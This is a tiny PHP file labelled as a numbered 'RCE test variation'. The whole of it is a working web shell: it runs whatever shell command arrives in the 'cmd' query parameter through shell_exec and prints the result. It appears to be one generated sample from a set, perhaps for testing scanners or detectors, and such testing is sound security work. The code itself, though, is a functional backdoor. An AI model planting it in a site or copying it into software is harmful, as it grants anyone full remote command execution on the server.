<?php
// RCE test variation #556
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>